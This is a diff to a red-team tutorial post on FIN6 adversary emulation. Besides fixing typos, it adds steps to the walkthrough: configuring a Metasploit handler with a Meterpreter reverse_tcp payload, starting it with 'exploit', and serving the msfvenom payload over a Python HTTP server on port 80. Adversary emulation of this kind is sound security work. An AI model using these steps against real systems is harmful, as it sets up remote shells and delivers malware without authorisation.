@@ -82,7 +82,7 @@ As youn can see, the payload is currently set to default `generic/shell_reverse_
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 ```
 
-Aside from, we can also see that LHOST needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.
+Aside from that, we can also see that LHOST needs to be set. We don’t need to set LPORT because it already matches the option we set for the payload.
 
 We can set the LHOST option with the following command:
 
@@ -95,11 +95,18 @@ Once done, you should now have a similar configuration on the screenshot below.
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_MsfConsole_Final_Show_Options.png){:width="100%"}
 
 
-### 1.4 - Transer Payload via Server
+To start the handler, just execute the following command.
 
-Next we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlir. 
+```bash
+msf6 exploit(multi/handler) > exploit
+```
 
-To to this, Open another terminal tab then start a Python3 HTTP server on port 80:
+
+### 1.4 - Tranfser the Payload via Server
+
+Next we need to set up an HTTP server to transer the _MsfVenom_ payload that we have created earlier. 
+
+To do this, Open another terminal tab then start a Python3 HTTP server on port 80:
 
 ```bash
 sudo python3 -m http.server 80
